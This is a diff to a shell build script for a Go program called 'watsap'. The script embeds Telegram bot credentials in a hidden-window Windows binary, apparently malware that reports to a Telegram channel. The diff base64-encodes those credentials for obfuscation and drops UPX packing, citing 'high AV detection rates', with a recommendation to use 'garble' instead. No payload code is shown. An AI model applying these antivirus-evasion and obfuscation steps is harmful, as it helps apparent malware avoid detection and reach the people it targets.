@@ -115,8 +115,11 @@ read -r -p "Choice [1-2]: " build_type
 log_info "Switching to source directory: $SOURCE_DIR"
 cd "$SOURCE_DIR" || exit
 
-# Inject environment variables into the binary
-BASE_LDFLAGS="-X 'watsap/utils/config.TG_BOT_TOKEN=$TG_BOT_TOKEN' -X 'watsap/utils/config.TG_CHAT_ID=$TG_CHAT_ID'"
+# Inject environment variables into the binary (Base64 Encoded for basic obfuscation)
+ENC_BOT_TOKEN=$(echo -n "$TG_BOT_TOKEN" | base64)
+ENC_CHAT_ID=$(echo -n "$TG_CHAT_ID" | base64)
+
+BASE_LDFLAGS="-X 'watsap/utils/config.TG_BOT_TOKEN=$ENC_BOT_TOKEN' -X 'watsap/utils/config.TG_CHAT_ID=$ENC_CHAT_ID'"
 
 if [[ "$build_type" == "1" ]]; then
     # === RELEASE MODE ===
@@ -132,9 +135,7 @@ if [[ "$build_type" == "1" ]]; then
         -ldflags "$BASE_LDFLAGS -s -w -H=windowsgui" \
         -o "$DIST_DIR/watsap-windows-$GOARCH.exe" .
 
-    # Compression
-    log_info "Compressing binaries with UPX..."
-    upx -9 -q -f --no-owner "$DIST_DIR/watsap-windows-$GOARCH.exe" "$DIST_DIR/watsap-linux-$GOARCH.bin" >/dev/null
+    log_warn "UPX compression has been disabled due to high AV detection rates. Consider using 'garble' for obfuscation."
 
 else
     # === DEBUG MODE ===
